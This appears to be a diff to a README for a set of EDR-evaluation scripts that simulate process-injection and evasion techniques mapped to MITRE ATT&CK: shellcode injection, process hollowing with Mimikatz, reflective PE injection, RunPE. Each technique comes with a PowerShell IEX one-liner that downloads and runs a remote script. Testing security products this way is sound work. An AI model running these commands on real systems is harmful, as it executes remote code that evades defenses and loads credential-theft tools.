@@ -84,15 +84,23 @@ Adversaries may inject code into processes in order to evade process-based defen
 
 https://attack.mitre.org/techniques/T1055/
 
-### 1. Shellcode Entry Injection
+### Shellcode Entry Injection
 Injection of shellcode into the entry of a legitimate spawn process
 In this example we will inject shellcode into notepad that spawns calculator
 
-** Unfortunately MITRE doesn't have a technique mapping to shellcode injection, nevertheless its own of the popular evasion techniques **
+** Unfortunately MITRE doesn't have a technique mapping to shellcode injection, nevertheless its one of the popular evasion techniques **
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
 
-### 2. Hollowing
+### Shellcode Import Address Table Execution
+Iteration through process environment block while searching ntdll "openprocess" system call from within the import of kernelbase.dll (legitimate core dll)
+
+** Unfortunately MITRE doesn't have a technique mapping to shellcode execution, nevertheless its one of the popular evasion techniques **
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-IAT-Shellcode.ps1"); Invoke-IAT-Shellcode;`
+
+
+### Hollowing
 Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. 
 Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. In this example we will hollow legitimate windows msbuild 64 bit process with Mimikatz process 
 
@@ -100,7 +108,7 @@ https://attack.mitre.org/techniques/T1055/012/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Hollowing64.ps1"); Invoke-Hollow64;`
 
-### 3. Reflective PE Injection
+### Reflective PE Injection
 In this example we will reflectively load a simple MsgBox dll within a remote process (the dll is 64bit), 
 Reflective loading allows to load a full executable in a legitimate application while bypassing image load monitoring
 This also allows to load executable that is not on the disk. We will use the known PowerSploit PE injection.
@@ -109,7 +117,7 @@ https://attack.mitre.org/techniques/T1620/
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ReflectivePEInjection.ps1"); Invoke-ReflectivePEInjection -ProcName explorer;`
 
-### 3. RunPE Injection
+### RunPE Injection
 Similar to Process hollowing with one very important difference, the injection of the executable is done locally within the same process while bypassing EDR solutions,
 Many times implemented as part of advanced malwares such as RAT to evade detection and as part of custom packer.
 
